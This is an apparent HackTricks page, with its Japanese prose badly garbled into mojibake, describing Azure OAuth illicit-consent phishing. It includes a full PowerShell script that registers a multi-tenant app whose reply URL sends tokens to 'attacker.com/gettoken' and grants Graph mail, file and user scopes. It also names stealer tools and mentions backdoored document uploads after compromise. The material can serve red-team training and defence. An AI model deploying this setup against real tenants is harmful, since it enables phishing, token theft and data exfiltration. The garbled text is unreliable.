# Az - Illicit Consent Grant

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## OAuth App Phishing

**Azure Applications** ã¯ **ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‡ãƒ¼ã‚¿**ï¼ˆåŸºæœ¬æƒ…å ±ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã€ãƒ¡ãƒ¼ãƒ«é€ä¿¡ãªã©ï¼‰ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã‚’æ±‚ã‚ã¾ã™ã€‚\
**è¨±å¯ã•ã‚Œã‚‹**ã¨ã€é€šå¸¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**ã€Œä½å½±éŸ¿ã€æ¨©é™**ã®ã¿ã‚’æ‰¿èªã§ãã¾ã™ã€‚ãã‚Œä»¥å¤–ã®å ´åˆã¯ã€**ç®¡ç†è€…ã®åŒæ„ãŒå¿…è¦**ã§ã™ã€‚\
`GA`ã€`ApplicationAdministrator`ã€`CloudApplication` `Administrator` ãŠã‚ˆã³ `permission to grant permissions to applications` ã‚’å«ã‚€ã‚«ã‚¹ã‚¿ãƒ ãƒ­ãƒ¼ãƒ«ã¯ã€ãƒ†ãƒŠãƒ³ãƒˆå…¨ä½“ã®åŒæ„ã‚’æä¾›ã§ãã¾ã™ã€‚

ç®¡ç†è€…ã®åŒæ„ã‚’å¿…è¦ã¨ã—ãªã„æ¨©é™ã®ã¿ãŒ**ä½å½±éŸ¿**ã¨ã—ã¦åˆ†é¡ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ã€**åŸºæœ¬çš„ãªã‚µã‚¤ãƒ³ã‚¤ãƒ³ã«å¿…è¦ãªæ¨©é™ã§ã‚ã‚Šã€openidã€profileã€emailã€User.Readã€ãŠã‚ˆã³ offline\_access** ã§ã™ã€‚**çµ„ç¹”**ãŒ**ã™ã¹ã¦ã®ã‚¢ãƒ—ãƒªã«å¯¾ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åŒæ„ã‚’è¨±å¯**ã™ã‚‹å ´åˆã€å¾“æ¥­å“¡ã¯è‡ªåˆ†ã®ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ä¸Šè¨˜ã®æƒ…å ±ã‚’èª­ã¿å–ã‚‹ãŸã‚ã®ã‚¢ãƒ—ãƒªã«åŒæ„ã‚’ä¸ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯**æ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ—ãƒª**ã‚’æº–å‚™ã—ã€**ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°**ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«**ã‚¢ãƒ—ãƒªã‚’å—ã‘å…¥ã‚Œã•ã›ã¦ãƒ‡ãƒ¼ã‚¿ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

### 2 Types of Illicit Consent Grant Attacks

* **Unauthenticated**: å¤–éƒ¨ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰ `User.Read` ãŠã‚ˆã³ `User.ReadBasic.All` ã®æ¨©é™ã‚’æŒã¤ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½œæˆã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã—ã¦ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªæƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚
* ã“ã‚Œã¯ã€ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå¤–éƒ¨ç’°å¢ƒã‹ã‚‰ã®OAuthã‚¢ãƒ—ãƒªã‚’å—ã‘å…¥ã‚Œã‚‹ã“ã¨ãŒã§ãã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼
* **Authenticated**: ååˆ†ãªç‰¹æ¨©ã‚’æŒã¤ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã‚’ä¾µå®³ã—ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆå†…ã«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½œæˆã—ã€ç‰¹æ¨©OAuthæ¨©é™ã‚’å—ã‘å…¥ã‚Œã‚‹ã“ã¨ãŒã§ãã‚‹ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã—ã¾ã™ã€‚
* ã“ã®å ´åˆã€ã™ã§ã«ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ãŸã‚ã€`User.ReadBasic.All` ã®æ¨©é™ã¯ã‚‚ã¯ã‚„èˆˆå‘³æ·±ãã‚ã‚Šã¾ã›ã‚“ã€‚
* **ç®¡ç†è€…ãŒä»˜ä¸ã™ã‚‹å¿…è¦ãŒã‚ã‚‹æ¨©é™**ã«èˆˆå‘³ãŒã‚ã‚‹å¯èƒ½æ€§ãŒé«˜ã„ã§ã™ã€‚ãªãœãªã‚‰ã€é€šå¸¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯OAuthã‚¢ãƒ—ãƒªã«æ¨©é™ã‚’ä¸ãˆã‚‹ã“ã¨ãŒã§ããªã„ãŸã‚ã€**ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã¿ã‚’ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã™ã‚‹å¿…è¦ãŒã‚ã‚‹**ã‹ã‚‰ã§ã™ï¼ˆå¾Œã§ã“ã®ç‰¹æ¨©ã‚’ä»˜ä¸ã™ã‚‹å½¹å‰²/æ¨©é™ã«ã¤ã„ã¦è©³ã—ãèª¬æ˜ã—ã¾ã™ï¼‰ã€‚

### Check if users allowed to consent

æ¬¡ã®PowerShellã‚³ãƒãƒ³ãƒ‰ã¯ã€Azure Active Directory (Azure AD) ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«åŒæ„ã§ãã‚‹ã‹ã©ã†ã‹ã®åŒæ„è¨­å®šã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åŒæ„ã‚’ç„¡åŠ¹ã«ã™ã‚‹**: ã“ã®è¨­å®šã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ã‚’ç¦æ­¢ã—ã¾ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åŒæ„ã¯è¨±å¯ã•ã‚Œã¾ã›ã‚“ã€‚
* **æ¤œè¨¼æ¸ˆã¿ã®ç™ºè¡Œè€…ã¾ãŸã¯çµ„ç¹”ã®ã‚¢ãƒ—ãƒªã«å¯¾ã—ã¦ã®ã¿ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒåŒæ„ã§ãã‚‹**: ã“ã®è¨­å®šã¯ã€ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ¤œè¨¼æ¸ˆã¿ã®ç™ºè¡Œè€…ã«ã‚ˆã£ã¦å…¬é–‹ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŠã‚ˆã³è‡ªåˆ†ã®ãƒ†ãƒŠãƒ³ãƒˆã«ç™»éŒ²ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã®ã¿åŒæ„ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ç‰¹å®šã®æ¨©é™ã«å¯¾ã—ã¦ã®ã¿åŒæ„ã‚’è¨±å¯ã™ã‚‹ã“ã¨ã§ã€åˆ¶å¾¡ã®å±¤ã‚’è¿½åŠ ã—ã¾ã™ã€‚
* **ã™ã¹ã¦ã®ã‚¢ãƒ—ãƒªã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒåŒæ„ã§ãã‚‹**: ã“ã®è¨­å®šã¯ã‚ˆã‚Šå¯›å®¹ã§ã€ç®¡ç†è€…ã®åŒæ„ã‚’å¿…è¦ã¨ã—ãªã„é™ã‚Šã€ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ä»»æ„ã®æ¨©é™ã«åŒæ„ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
* **ã‚«ã‚¹ã‚¿ãƒ ã‚¢ãƒ—ãƒªåŒæ„ãƒãƒªã‚·ãƒ¼**: ã“ã®è¨­å®šã¯ã€ç‰¹å®šã®çµ„ç¹”ã®è¦ä»¶ã«åˆã‚ã›ã¦èª¿æ•´ã§ãã‚‹ã‚«ã‚¹ã‚¿ãƒ ãƒãƒªã‚·ãƒ¼ãŒå­˜åœ¨ã™ã‚‹ã“ã¨ã‚’ç¤ºã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚¢ãƒ—ãƒªã®ç™ºè¡Œè€…ã€ã‚¢ãƒ—ãƒªãŒè¦æ±‚ã™ã‚‹æ¨©é™ã€ãã®ä»–ã®è¦å› ã«åŸºã¥ãåˆ¶é™ã®çµ„ã¿åˆã‚ã›ã‚’å«ã‚€å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

## **Illicit Consent Grant Attackã®ç†è§£**

Illicit Consent Grant Attackã§ã¯ã€æ”»æ’ƒè€…ãŒã‚¨ãƒ³ãƒ‰ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’é¨™ã—ã¦ã€Azureã«ç™»éŒ²ã•ã‚ŒãŸæ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«æ¨©é™ã‚’ä»˜ä¸ã•ã›ã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ­£å½“ãªã‚‚ã®ã«è¦‹ã›ã‹ã‘ã€è¢«å®³è€…ãŒçŸ¥ã‚‰ãšã«ã€Œæ‰¿èªã€ãƒœã‚¿ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã‚ˆã†ã«ä»•å‘ã‘ã‚‹ã“ã¨ã§è¡Œã‚ã‚Œã¾ã™ã€‚ãã®çµæœã€Azure ADã¯æ”»æ’ƒè€…ã®ã‚µã‚¤ãƒˆã«ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç™ºè¡Œã—ã€æ”»æ’ƒè€…ãŒè¢«å®³è€…ã®ãƒ‡ãƒ¼ã‚¿ï¼ˆä¾‹ãˆã°ã€ãƒ¡ãƒ¼ãƒ«ã®èª­ã¿å–ã‚Šã‚„é€ä¿¡ã€ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦æ“ä½œã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚çµ„ç¹”ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ã€‚

## **æ”»æ’ƒãƒ•ãƒ­ãƒ¼ã®æ¦‚è¦**

ã“ã®æ”»æ’ƒã¯ã€ä¸€èˆ¬çš„ãªä¼æ¥­ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã—ãŸã„ãã¤ã‹ã®ã‚¹ãƒ†ãƒƒãƒ—ã‚’å«ã¿ã¾ã™ã€‚ä»¥ä¸‹ã¯ãã®å±•é–‹æ–¹æ³•ã§ã™ï¼š

1. **ãƒ‰ãƒ¡ã‚¤ãƒ³ç™»éŒ²ã¨ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ›ã‚¹ãƒ†ã‚£ãƒ³ã‚°**: æ”»æ’ƒè€…ã¯ä¿¡é ¼ã§ãã‚‹ã‚µã‚¤ãƒˆã«ä¼¼ãŸãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’ç™»éŒ²ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€ã€Œsafedomainlogin.comã€ã€‚ã“ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ä¸‹ã«ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ï¼ˆä¾‹ï¼šã€Œcompanyname.safedomainlogin.comã€ï¼‰ã‚’ä½œæˆã—ã€èªè¨¼ã‚³ãƒ¼ãƒ‰ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¦æ±‚ã™ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ãƒ›ã‚¹ãƒˆã—ã¾ã™ã€‚
2. **Azure ADã§ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ç™»éŒ²**: æ”»æ’ƒè€…ã¯ã€è‡ªåˆ†ã®Azure ADãƒ†ãƒŠãƒ³ãƒˆã«ãƒãƒ«ãƒãƒ†ãƒŠãƒ³ãƒˆã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç™»éŒ²ã—ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆä¼æ¥­ã®åå‰ã‚’ä»˜ã‘ã¦æ­£å½“ãªã‚‚ã®ã«è¦‹ã›ã‹ã‘ã¾ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆURLã‚’æ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ãƒ›ã‚¹ãƒˆã™ã‚‹ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã«è¨­å®šã—ã¾ã™ã€‚
3. **æ¨©é™ã®è¨­å®š**: æ”»æ’ƒè€…ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã•ã¾ã–ã¾ãªAPIæ¨©é™ï¼ˆä¾‹ï¼š`Mail.Read`ã€`Notes.Read.All`ã€`Files.ReadWrite.All`ã€`User.ReadBasic.All`ã€`User.Read`ï¼‰ã‚’è¨­å®šã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®æ¨©é™ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦ä»˜ä¸ã•ã‚Œã‚‹ã¨ã€æ”»æ’ƒè€…ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ä»£ã‚ã£ã¦æ©Ÿå¯†æƒ…å ±ã‚’æŠ½å‡ºã§ãã¾ã™ã€‚
4. **æ‚ªæ„ã®ã‚ã‚‹ãƒªãƒ³ã‚¯ã®é…å¸ƒ**: æ”»æ’ƒè€…ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆIDã‚’å«ã‚€ãƒªãƒ³ã‚¯ã‚’ä½œæˆã—ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å…±æœ‰ã—ã¦åŒæ„ã‚’å¾—ã‚‹ã‚ˆã†ã«ä»•å‘ã‘ã¾ã™ã€‚

## **æ”»æ’ƒã«ãƒ„ãƒ¼ãƒ«ã‚’åˆ©ç”¨ã™ã‚‹**

ã“ã®æ”»æ’ƒã¯ã€[**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)ã®ã‚ˆã†ãªãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œã§ãã¾ã™ã€‚

### æ”»æ’ƒå‰ã®æº–å‚™:

æ”»æ’ƒè€…ãŒè¢«å®³è€…çµ„ç¹”ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å¯¾ã—ã¦ã‚ã‚‹ç¨‹åº¦ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€çµ„ç¹”ã®ãƒãƒªã‚·ãƒ¼ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ãƒ—ãƒªã®å—ã‘å…¥ã‚Œã‚’è¨±å¯ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€æ”»æ’ƒè€…ã¯ **Azure Tenant ã«æ–°ã—ã„ã‚¢ãƒ—ãƒªã‚’ä½œæˆ** ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆApp registrations å†…ã§ï¼‰ã€ä»¥ä¸‹ã®æ¨©é™ã§æ§‹æˆã•ã‚Œã¾ã™ï¼š

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` ã¯ `Microsoft Graph` ã® `Delegated permissions` å†…ã«ã‚ã‚Šã¾ã™ã€‚ï¼ˆApplication permissions ã¯å¸¸ã«è¿½åŠ ã®æ‰¿èªãŒå¿…è¦ã§ã™ï¼‰ã€‚

* `User.ReadBasic.All` ã¯ã€è¨±å¯ã•ã‚Œã‚‹ã¨çµ„ç¹”å†…ã®**ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã‚’èª­ã‚€**ã“ã¨ãŒã§ãã‚‹æ¨©é™ã§ã™ã€‚
* `GA`ã€`ApplicationAdministrator`ã€`CloudApplication` `Administrator` ãŠã‚ˆã³ `permission to grant permissions to applications` ã‚’å«ã‚€ã‚«ã‚¹ã‚¿ãƒ ãƒ­ãƒ¼ãƒ«ã®ã¿ãŒãƒ†ãƒŠãƒ³ãƒˆå…¨ä½“ã®åŒæ„ã‚’æä¾›ã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**ç®¡ç†è€…ã®åŒæ„ãŒå¿…è¦ãªã‚¢ãƒ—ãƒªã‚’æ‰¿èªã•ã›ãŸã„å ´åˆ**ã¯ã€ã“ã‚Œã‚‰ã®å½¹å‰²ã®ã„ãšã‚Œã‹ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’**ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

cli ã‚’ä½¿ç”¨ã—ã¦ã‚¢ãƒ—ãƒªã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€è¨­å®šæ–¹æ³•ã‚’å­¦ã³ã¾ã—ã‚‡ã†ã€‚

{% hint style="warning" %}
å–å¾—ã—ãŸ **access token** ã¯ã€ã‚¹ã‚³ãƒ¼ãƒ— `User.Read` ã¨ `User.ReadBasic.All`ï¼ˆè¦æ±‚ã•ã‚ŒãŸæ¨©é™ï¼‰ã‚’æŒã¤ **graph endpoint** ç”¨ã§ã™ã€‚ä»–ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯å®Ÿè¡Œã§ãã¾ã›ã‚“ï¼ˆãŸã ã—ã€ã“ã‚Œã‚‰ã®æ¨©é™ã¯çµ„ç¹”å†…ã®ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢ã™ã‚‹æƒ…å ±ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã®ã«ååˆ†ã§ã™ï¼‰ã€‚
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

ã“ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

## Post-Exploitation

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸå¾Œã€æ©Ÿå¯†æ–‡æ›¸ã‚’ç›—ã‚“ã ã‚Šã€ãƒãƒƒã‚¯ãƒ‰ã‚¢ä»˜ãã®æ–‡æ›¸ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
AWS Hacking ã‚’å­¦ã³ã€ç·´ç¿’ã—ã¾ã—ã‚‡ã†:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking ã‚’å­¦ã³ã€ç·´ç¿’ã—ã¾ã—ã‚‡ã†: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**subscription plans**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegram group**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¾ã—ã‚‡ã†ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ãŠã‚ˆã³ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã® github ãƒªãƒã‚¸ãƒˆãƒªã« PR ã‚’æå‡ºã—ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¾ã—ã‚‡ã†ã€‚

</details>
{% endhint %}
